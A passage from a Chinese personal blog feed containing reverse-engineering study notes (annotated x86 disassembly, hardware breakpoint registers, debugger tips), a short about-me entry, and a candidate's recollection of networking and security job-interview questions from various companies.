class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D114C0 &gt;  55              push    ebp</span><br><span class=\"line\">00D114C1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D114C3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D114C9    53              push    ebx</span><br><span class=\"line\">00D114CA    56              push    esi</span><br><span class=\"line\">00D114CB    57              push    edi</span><br><span class=\"line\">00D114CC    51              push    ecx</span><br><span class=\"line\">00D114CD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D114D3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D114D8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D114DD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D114DF    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\">//以下四句为\tTest.SetTest(1);的关键代码</span><br><span class=\"line\">00D114E0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx    ;ecx此时为this, i = this </span><br><span class=\"line\">00D114E3    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]\t  ;ebp-8是this, eax=this</span><br><span class=\"line\">00D114E6    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]    ;ecx = 1 ,ebp+8是从外面传来的1</span><br><span class=\"line\">00D114E9    8908            mov     dword ptr ds:[eax],ecx        ;this-&gt;m = 1</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">00D114EB    5F              pop     edi</span><br><span class=\"line\">00D114EC    5E              pop     esi</span><br><span class=\"line\">00D114ED    5B              pop     ebx</span><br><span class=\"line\">00D114EE    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D114F0    5D              pop     ebp</span><br><span class=\"line\">00D114F1    C2 0400         retn    0x4</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D11510 &gt;  55              push    ebp</span><br><span class=\"line\">00D11511    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11513    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D11519    53              push    ebx</span><br><span class=\"line\">00D1151A    56              push    esi</span><br><span class=\"line\">00D1151B    57              push    edi</span><br><span class=\"line\">00D1151C    51              push    ecx</span><br><span class=\"line\">00D1151D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D11523    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D11528    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1152D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1152F    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//以下三句为int Number = Test.GetTest();的关键代码</span><br><span class=\"line\">00D11530    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11533    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D11536    8B00            mov     eax,dword ptr ds:[eax]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11538    5F              pop     edi</span><br><span class=\"line\">00D11539    5E              pop     esi</span><br><span class=\"line\">00D1153A    5B              pop     ebx</span><br><span class=\"line\">00D1153B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1153D    5D              pop     ebp</span><br><span class=\"line\">00D1153E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"动态调试基础\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础\">#</a> 动态调试基础</h2>\n<h3 id=\"断点\"><a class=\"markdownIt-Anchor\" href=\"#断点\">#</a> 断点</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DR0~DR3这四个寄存器是断点地址存储器,用于保存断点的地址</span><br><span class=\"line\">DR6是调试状态寄存器用于指明DR0~DR3寄存器中哪一个产生了调试异常</span><br><span class=\"line\">DR6寄存器使用比特位B0~B3来指明DR0~DR3中哪个产生了调试异常</span><br><span class=\"line\">DR7是断点属性控制器</span><br><span class=\"line\">DR7寄存器分别保存着DR0~DR3的断点地址对应的断点的属性,属性有如下几种:</span><br><span class=\"line\">L0~L3:这个比特位等于1,则断点为本地断点.</span><br><span class=\"line\">G0~G3:这个比特位等于1,则断点为全局断点.</span><br><span class=\"line\">R/W0-R/W3:</span><br><span class=\"line\">00：执行断点</span><br><span class=\"line\">01：数据写入断点</span><br><span class=\"line\">10：I/0读写断点</span><br><span class=\"line\">11：读写断点()读取指令不算)</span><br></pre></td></tr></table></figure>\n<p>DR0-DR3 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191812086-b457e0fc-6a04-403f-a7f4-848fd2617c6e.png\" alt=\"img\"></p>\n<p>删除硬件断点 调试 -&gt; 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191872090-b8599c55-b435-459d-9cbc-ec378d651497.png\" alt=\"img\"></p>\n<p>设置硬件断点  右键 -&gt; 断点 -&gt; 硬件执行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112211213663.png\" alt=\"image-20221112211213663\"></p>\n<p>取消硬件断点：  hd 基址</p>\n<p>对当前地址做中断，即添加硬件断点： hr 基址</p>\n<p>常用断点：软件断点，内存写入，内存访问，硬件执行</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192756712-0636b463-746a-4c86-8b38-44b2bb9597c5.png\" alt=\"img\"></p>\n<p>ALT+M 内存镜像</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192833816-1b08c4ac-e51c-419e-906d-f288dd1d9a22.png\" alt=\"img\"></p>\n<h3 id=\"常用调试器\"><a class=\"markdownIt-Anchor\" href=\"#常用调试器\">#</a> 常用调试器</h3>\n<h4 id=\"ollyice\"><a class=\"markdownIt-Anchor\" href=\"#ollyice\">#</a> OllyICE</h4>\n<p>查看在内存在对应的字节码，即指令在内存中的机器码</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194426316-532565d9-fa78-44e2-b792-c1d4f47c3c65.png\" alt=\"img\"></p>\n<p>一般来说程序映射到内存中基址从 0040 开始，即 PE 文件头</p>\n<p>映射到代码段需要 + 1000，前 1000 是 PE 头信息</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194544858-688f3db0-11f9-4a14-b509-46464ef0c7e3.png\" alt=\"img\"></p>\n<p>8087 中浮点运行，反调试会用到</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214201466.png\" alt=\"image-20221112214201466\"></p>\n<p>用于轴坐标，准心，多用于游戏分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214252305.png\" alt=\"image-20221112214252305\"></p>\n<h4 id=\"xdbg\"><a class=\"markdownIt-Anchor\" href=\"#xdbg\">#</a> xdbg</h4>\n<p>1. 线程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214836603.png\" alt=\"image-20221112214836603\"></p>\n<p>stdcall 一般在函数内部做 ret 做堆栈平衡</p>\n<p>windbg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:004&gt; g</span><br><span class=\"line\">(a5c.9dc): Break instruction exception - code 80000003 (first chance)</span><br><span class=\"line\">eax=7efda000 ebx=00000000 ecx=00000000 edx=77a4f7ea esi=00000000 edi=00000000</span><br><span class=\"line\">eip=779c000c esp=02adff5c ebp=02adff88 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class=\"line\">ntdll!DbgBreakPoint:</span><br><span class=\"line\">779c000c cc              int     3</span><br><span class=\"line\">0:004&gt; bp kernel32!OpenProcess</span><br><span class=\"line\">0:004&gt; u kernel32!OpenProcess</span><br><span class=\"line\">kernel32!OpenProcess:</span><br><span class=\"line\">76831986 8bff            mov     edi,edi</span><br><span class=\"line\">76831988 55              push    ebp</span><br><span class=\"line\">76831989 8bec            mov     ebp,esp</span><br><span class=\"line\">7683198b 5d              pop     ebp</span><br><span class=\"line\">7683198c eb05            jmp     kernel32!OpenProcess+0xd (76831993)</span><br><span class=\"line\">7683198e 90              nop</span><br><span class=\"line\">7683198f 90              nop</span><br><span class=\"line\">76831990 90              nop</span><br><span class=\"line\">0:004&gt; u 76831993</span><br><span class=\"line\">kernel32!OpenProcess+0xd:</span><br><span class=\"line\">76831993 ff2554098376    jmp     dword ptr [kernel32+0x10954 (76830954)]</span><br><span class=\"line\">76831999 90              nop</span><br><span class=\"line\">7683199a 90              nop</span><br><span class=\"line\">7683199b 90              nop</span><br><span class=\"line\">7683199c 90              nop</span><br><span class=\"line\">7683199d 90              nop</span><br><span class=\"line\">kernel32!WaitForMultipleObjectsEx:</span><br><span class=\"line\">7683199e 8bff            mov     edi,edi</span><br><span class=\"line\">768319a0 55              push    ebp</span><br></pre></td></tr></table></figure>\n<p>VT</p>\n<p>需要开启</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221113204110511.png\" alt=\"image-20221113204110511\"></p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/",
            "url": "http://example.com/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/",
            "title": "about me",
            "date_published": "2022-10-30T06:09:01.098Z",
            "content_html": "<p>Welcome to my blog!</p>\n<h2 id=\"you-can-find-me-in-the-following-ways\"><a class=\"markdownIt-Anchor\" href=\"#you-can-find-me-in-the-following-ways\">#</a> You can find me in the following ways</h2>\n<p>1.Contact with WeChat or QQ ：183108913</p>\n<p>2.When you come to Xi’an, we can have an offline meeting</p>\n<h2 id=\"about-me\"><a class=\"markdownIt-Anchor\" href=\"#about-me\">#</a> About me</h2>\n<p>no introduction</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "url": "http://example.com/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/",
            "title": "秋招面试题",
            "date_published": "2022-10-28T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招面试题\"><a class=\"markdownIt-Anchor\" href=\"#秋招面试题\">#</a> 秋招面试题</h1>\n<h2 id=\"1特斯拉-网络工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#1特斯拉-网络工程师-一面\">#</a> 1. 特斯拉 - 网络工程师 - 一面</h2>\n<blockquote>\n<p>0. 自我介绍 (不限语言)</p>\n<p>1. 有哪些直辖市</p>\n<p>2. 鲁迅故居</p>\n<p>3. 东三省</p>\n<p>4. 曹操哪个朝代</p>\n<p>5. 唐宋八大家</p>\n<p>6. 苏轼苏洵苏辙 关系</p>\n<p>7. 表格堂哥区别</p>\n<p>6.DHCP 工作原理</p>\n<p>7.DNS port</p>\n<p>8.dhcp 配置时 IP helper-address</p>\n<p>9.Liunx 内核，发行版</p>\n<p>10.mac 地址哪一层</p>\n<p>11. 网管干啥</p>\n<p>12.aws 干啥</p>\n<p>13. 项目和实习时的区别</p>\n<p>14. 能用 python 写一些自动获取 ip 的脚本吗，不是 dhcp，是 SDN 那类</p>\n<p>15.kali 一般用那些工具</p>\n<p>16. 生涯规划 你到底要干安全还是网络<br>\n (面网络别提安全)</p>\n<p>17. 你还有啥想问的</p>\n<p>立即推 ， 当场送走</p>\n<p>一共 22 分钟，两个面试官，先问常识，再问网络，最后实习项目校园经历，一般都是按照简历顺序问的</p>\n</blockquote>\n<h2 id=\"2理想汽车-安全运营-一面\"><a class=\"markdownIt-Anchor\" href=\"#2理想汽车-安全运营-一面\">#</a> 2. 理想汽车 - 安全运营 - 一面</h2>\n<blockquote>\n<p>有啥安全相关的项目或者实习经历<br>\n答：没有，但我干过 CTF</p>\n<p>CTF 那件事情你最印象深刻<br>\n答：php 反序列化<br>\n此处省略 1k 字<br>\n从原理防御 到 pop 链</p>\n<p>既然说到了 pop 链，说说看 php 里面的魔法方法吧</p>\n<p>说到了 wakeup 绕过，这个在 php 某些版本有用，还是通杀<br>\n答：只记得是 cve 漏洞，在 &lt; 7.0 的版本测试过</p>\n<p>逻辑漏洞任意邮箱注册怎么修 指的是激活账号时修改邮箱导致任意邮箱注册，也可以理解为任意邮箱激活<br>\n答：加 token 追问：在哪加，是注册的时候加，还是激活的时候加<br>\n寄</p>\n<p>富文本编辑器 XSS 怎么修</p>\n<p>sql 注入防御</p>\n<p>PDO 在无法限制的场景比如 order by 该怎么办</p>\n<p>以上三道及回答均在胡扯，答案自己百度去吧</p>\n<p>入侵排查 排查哪些 shell 脚本一般要写哪些</p>\n<p>追问 netstat 怎么查看，那么多 ip 那个是危险的<br>\n - lntup grep establish<br>\n 怎么找到进程<br>\n有对应的 PID<br>\n 排查进程启动项…</p>\n<p>渗透的时候印象深刻的事<br>\n横向，向日葵</p>\n<p>discuz 漏洞复现<br>\n任意文件删除 cookie 存注入</p>\n<p>cookie 对单个参数限制长度，如何绕过</p>\n<p>能用 sqlmap 为啥还要自己写脚本</p>\n<p>Python 私有方法 lamdba 表达式 map sum<br>\na[1,2,3,4,5]<br>\na[1::3]<br>\nsum(map(lamdba(x:x+3))) == 13</p>\n<p>数组切片</p>\n<p>对于出现了 0day，该怎么对公司资产进行排查</p>\n<p>全程大概 1 个小时，人都麻了</p>\n</blockquote>\n<h2 id=\"3快手-idc运营网络方向-一面\"><a class=\"markdownIt-Anchor\" href=\"#3快手-idc运营网络方向-一面\">#</a> 3. 快手 - IDC 运营网络方向 - 一面</h2>\n<blockquote>\n<p>我看你写的网络工程，讲讲你的专业课掌握程度<br>\n答：tcpip 会一点，网络编程一般</p>\n<p>专业排名</p>\n<p>tcpip 滑动窗口原理 滑动窗口初始值是多少<br>\n慢启动是啥<br>\n tcpip 多少层，都是啥，每层作用 (参考数据包的封装 解封装)<br>\n tcp syc flood 原理防御<br>\n答：限制连接数和连接时间<br>\n然后用他就反驳了我，这两个办法都有待商榷</p>\n<p>ospf<br>\n 负载分担怎么实现 答：开销<br>\n两台路由器之间取消负载分担，只需要 A-&gt;B 不负载分担，回程不管，在哪配开销，为什么 答：在 A 配，路由表的原因<br>\n那 b 呢，如果不配来回路径不一致会有问题吗</p>\n<p>一个区域中如果网络类型为 p2p 会有几类 LSA</p>\n<p>lsa 类型 只需要说常见的既可以</p>\n<p>ospf 防环 区域间区域内</p>\n<p>spf 算法</p>\n<p>bgp 属性</p>\n<p>origin network 路由和汇总路由都是什么 origin 不同 origin 优先级那个更优 origin 怎么控制选路 答： bgprou -&gt; iprou</p>\n<p>双点双向 重发布</p>\n<p>项目 交换机类型 上下连 端口 收敛比</p>\n<p>全程 35 分钟左右，我又又又裂开了</p>\n</blockquote>\n<h2 id=\"4shareit-sre-一面\"><a class=\"markdownIt-Anchor\" href=\"#4shareit-sre-一面\">#</a> 4.SHAREit - SRE - 一面</h2>\n<blockquote>\n<p>接不接受 7*24oncall</p>\n<p>crontab * 字段含义</p>\n<p>Linux 版本</p>\n<p>http 状态码</p>\n<p>tcp 和 udp 区别</p>\n<p>怎样学习新知识</p>\n<p>k8s 了解</p>\n<p>怎样看文件夹大小 (du)</p>\n<p>分区挂载过程</p>\n<p>mysql 新建用户</p>\n<p>mysql 查看权限</p>\n<p>如果在周末出了 serv2 你第一个看到你怎么做</p>\n<p>使用过公有云吗</p>\n<p>有哪些负载均衡器</p>\n<p>有哪些监控软件</p>\n<p>怎样查看和本机建立了连接的 IP</p>\n<p>怎么判断主机之间是否连通</p>\n<p>怎么样判断主机之间端口是否开放</p>\n<p>用过 python 和 shell 吗，用 python 干了啥，用 shell 干了啥</p>\n</blockquote>\n<h2 id=\"5信锐-技术服务工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#5信锐-技术服务工程师-一面\">#</a> 5. 信锐 - 技术服务工程师 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>实习干啥的</p>\n<p>访问网页过程</p>\n<p>电脑获取地址方法 (讲了手工配和 dhcp, 详细讲了 dhcp)</p>\n<p>接上一题：你说 dhcp 有哪些报文？</p>\n<p>路由协议分类</p>\n<p>讲一种你熟悉的路由协议</p>\n<p>学习方法 (怎样学习新知识)</p>\n<p>网管干啥的 (简历上的，在学校担任过)</p>\n<p>讲了一下在学校 troubleshooting 的思路</p>\n<p>唐都项目干啥的</p>\n<p>讲了一下干了个啥</p>\n<p>生涯规划</p>\n<p>还有啥问题想问的</p>\n</blockquote>\n<h2 id=\"6信锐-技术支持-二面\"><a class=\"markdownIt-Anchor\" href=\"#6信锐-技术支持-二面\">#</a> 6. 信锐 - 技术支持 - 二面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>网络通信两种模型，区别<br>\n OSI TCP</p>\n<p>怎么保证可靠性和安全性<br>\n冗余 安全</p>\n<p>为什么要考 ie<br>\n 先说了一个技术方面，他说只有技术吗，没有对职业的规划？我后面补充了我是网工的啦，以后想干这行啦，最后也扯回到了职业规划</p>\n<p>ie 证书咋考的，为啥第一次面试没过，我说项目题挂了，他追问有哪些项目题，我说了一个企业网架构，三层架构，他追问每一层是干啥的，用到啥技术</p>\n<p>追着项目往死里问，问我为啥一个项目能做两个月，咋割接的，都 tm 快和他吵起来了，我和他讲是因为配置迁移问题，他死活说有问题</p>\n<p>唐都那个项目干啥了<br>\n简单说了一下排错和优化</p>\n<p>有啥没考过的证书</p>\n<p>过去一年最难的事<br>\n考 ie</p>\n<p>大学中印象最深的事<br>\n奖学金</p>\n<p>生涯规划</p>\n<p>你觉得和别人相比，你的优势是什么<br>\n我说我对于设备更了解一些啦</p>\n<p>有女朋友吗，为什么不找。那你是从来没谈过吗，高中谈过吗<br>\n沉迷学习，日渐消瘦</p>\n<p>如果有个你很喜欢的姑娘，但你父母死活不同意，怎么办<br>\n沟通，然后他就搞了各种各样的</p>\n<p>对技术支持的了解<br>\n对接客户和工程师</p>\n<p>以上两个是对逻辑的考察，评价是整体偏弱，需要考虑客户的痛点</p>\n<p>还有啥问题，我问的除了我说的两条，还有对于技术支持的工作还有什么补充的吗，他说的上面那条逻辑偏差</p>\n</blockquote>\n<h2 id=\"7深信服-安全服务-一面\"><a class=\"markdownIt-Anchor\" href=\"#7深信服-安全服务-一面\">#</a> 7. 深信服 - 安全服务 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>三层交换机和二层交换机的区别</p>\n<p>查看用户历史命令 怎么查看别人的历史命令</p>\n<p>文件上传 getshell 了但不能链接怎么排查</p>\n<p>你熟悉那种漏洞<br>\n答：sql 注入</p>\n<p>sql 注入有哪几种</p>\n<p>union select 后面可以跟 union select insert 吗</p>\n<p>union select 叫啥名字</p>\n<p>怎么通过数据库获取系统权限 mysql 呢，SQL server 呢<br>\n答 mysql 可以写 shell<br>\n 估计是想听 mysql 提权</p>\n<p>mysql 写 shell 的命令是啥</p>\n<p>堆叠注入原理</p>\n<p>堆叠注入和 union select 有啥区别</p>\n<p>报错注入原理，语句</p>\n<p>时间盲注原理，语句</p>\n<p>shrio 反序列化，fastjson 反序列化</p>\n<p>struct 漏洞<br>\n答：三个都不会</p>\n<p>讲讲 Java 反序列化</p>\n<p>内网渗透搭隧道怎么搭<br>\n答：可以用 earthworm</p>\n<p>earthworm 三种模式</p>\n<p>还有其他方法吗</p>\n<p>内网横向有哪些方法<br>\n答：ipc wmin psexec</p>\n<p>psexec 忘了问了啥了</p>\n<p>wmin 端口是啥，横向之后是什么权限</p>\n<p>权限维持有哪几种</p>\n<p>有安全项目和实习嘛</p>\n<p>怎么学习</p>\n<p>职业规划</p>\n<p>机构的课程结束了嘛</p>\n<p>有你印象的技术类博客嘛</p>\n</blockquote>\n<h2 id=\"8安天-网络安全管培生一面\"><a class=\"markdownIt-Anchor\" href=\"#8安天-网络安全管培生一面\">#</a> 8. 安天 - 网络安全管培生一面</h2>\n<blockquote>\n<p>我的自我介绍</p>\n<p>对于安全的理解</p>\n<p>学校主修的除了网安还有啥</p>\n<p>项目有啥和安全相关的</p>\n<p>实习有啥和安全相关的</p>\n<p>登录框有啥漏洞</p>\n<p>入侵排查</p>\n<p>讲讲你学的，举个例子<br>\n异或取反 beef</p>\n<p>有很多项目同时给你你咋办</p>\n<p>我们在沈阳北京哈尔滨都有站点，但沈阳是小站点，你怎么规划，如果你 base 沈阳</p>\n<p>如果你带领五个人的团队你怎么管理</p>\n<p>你又要干技术又要管理你怎么办</p>\n<p>网管碰到棘手的人咋办</p>\n<p>这哥们第一年招管培生和我谈论今天穿了什么</p>\n<p>你对于职业规划</p>\n<p>上一个来的是个 985 博士，已经研究员了</p>\n</blockquote>\n<h2 id=\"9长亭-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#9长亭-技术支持-一面\">#</a> 9. 长亭 - 技术支持 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>印象深刻项目<br>\n说了说割接</p>\n<p>然后问的挺详细</p>\n<p>实习经历</p>\n<p>说说看交换机 troubleshooting</p>\n<p>说说看服务器 troubleshooting</p>\n<p>有部署会操作系统吗<br>\n没有他们都是 pxe</p>\n<p>ce 和 ie 啥时候考的</p>\n<p>我看你网络的，说说 osi 每层协议</p>\n<p>osi 封装解封装</p>\n<p>tcp 四次挥手 timewait</p>\n<p>为啥握手三次挥手四次</p>\n<p>http 有哪几个版本，区别是啥</p>\n<p>https 原理<br>\n http 有哪些组成<br>\n头 行</p>\n<p>拿 linux 搭过什么服务<br>\n搭过网站</p>\n<p>哪些网站，怎么搭的</p>\n<p>nigix 搭过吗，讲讲特性</p>\n<p>nginx 有哪些负载分担模式</p>\n<p>邮件搭过吗 dns 搭过吗</p>\n<p>dns 原理是啥<br>\n我不知道于是我开始扯 log4j2 dnslog 外带</p>\n<p>我看你安全很懂哦，说说看 xss<br>\n 命名空间混淆突变，dom 破坏</p>\n<p>waf 是干啥的，那一层的</p>\n<p>类似于生涯规划的问题</p>\n<p>说说看你对长亭的理解</p>\n<p>说说看你对岗位的理解</p>\n<p>工作地点</p>\n<p>Q&amp;A</p>\n</blockquote>\n<h2 id=\"10宏杉-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#10宏杉-技术支持-一面\">#</a> 10. 宏杉 - 技术支持 - 一面</h2>\n<blockquote>\n<p>自我介绍</p>\n<p>考研吗考公吗</p>\n<p>大学啥专业，为啥投这个岗位</p>\n<p>证书自己花钱还是父母的钱</p>\n<p>ie 多少钱</p>\n<p>为啥考</p>\n<p>六级多少分四级多少分</p>\n<p>籍贯</p>\n<p>面试通过多久过来实习</p>\n<p>路由协议有哪些</p>\n<p>生成树作用</p>\n<p>super vlan</p>\n<p>dhcp</p>\n<p>链路聚合协议哪几种优缺点</p>\n<p>linux 启动过程</p>\n<p>定时任务</p>\n<p>全国分配可以接受？</p>\n<p>明年过年结束后可以过来</p>\n<p>家里干啥的</p>\n<p>兄弟姐妹几个</p>\n<p>期望薪资</p>\n</blockquote>\n<h2 id=\"11中科曙光-云平台网络研发工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#11中科曙光-云平台网络研发工程师-一面\">#</a> 11. 中科曙光 - 云平台网络研发工程师 - 一面</h2>\n<blockquote>\n<p>1.OSI 二层和三层有哪些协议</p>\n<p>2. 用过防火墙吗，有哪些功能，怎么保证安全，内部实现</p>\n<p>3.VPN 用过吗，IPSEC 详细原理了解过吗</p>\n<p>4.DHCP 报文交互过程，重启虚拟机发什么包</p>\n<p>5. 服务器端口没有 up</p>\n<p>6. 交换机端口没有 up</p>\n<p>7. 链路捆绑，两个端口 LACP 断了一边</p>\n<p>8. 开发接触过吗，python 作过哪些项目</p>\n<p>9. 毕业论文</p>\n<p>10. 啥时候实习</p>\n</blockquote>\n<h2 id=\"12汉德-云解决方案工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#12汉德-云解决方案工程师-一面\">#</a> 12. 汉德 - 云解决方案工程师 - 一面</h2>\n<blockquote>\n<p>0x00<br>\n 这家是秋招面了四五十家技术含量最高的企业，没有之一，问的太广了，问的还很深，扛不住扛不住，告辞</p>\n<p>linux<br>\n1.linux 进程状态<br>\n 3 running, 144 sleeping, 0 stopped, 1 zombie</p>\n<p>2. 检查服务是否运行</p>\n<p>3. 查看服务器 CPU，内存，磁盘利用率，linux 版本<br>\n内存：<br>\n[lighthouse@VM-16-11-centos ~]$ free<br>\ntotal used free shared buff/cache available<br>\nMem: 1881996 577340 112936 17348 1191720 1091156<br>\nSwap: 1049596 524544 525052<br>\n/proc/meminfo 内存<br>\n vmstat 内存<br>\n top 命令一般用于查看进程的 CPU 和内存使用情况<br>\n df -h lsblk fdisk -l 硬盘</p>\n<p>4.crontab<br>\n5. 常用 linux 命令<br>\n 6. 更改文件权限 chmod</p>\n<p>网络<br>\n 1.tcp 和 udp 区别<br>\n 2.get 和 post 区别<br>\n 3. 访问 www.xxx.com 发生了什么<br>\n 4.cookie 和 session 区别<br>\n 5. 状态码</p>\n<p>安全<br>\n 1.sql 注入，防御<br>\n 2. 安全工具<br>\n 3. 靶场<br>\n 4. 有哪些加密算法</p>\n<p>mysql<br>\n1.acid<br>\n2.mysql 锁<br>\n 3. 隔离界别<br>\n 4. 主键，外键，主键和索引区别</p>\n<p>操作系统<br>\n死锁<br>\n预防死锁<br>\n内存泄漏</p>\n<p>项目<br>\n实习</p>\n<p>比赛经历</p>\n<p>猜数字<br>\n四个数字不重复<br>\n 3456 1A 1B A 代表位置数字正确 B 代表只有数字正确</p>\n</blockquote>\n<h2 id=\"13宏杉-技术支持-二面\"><a 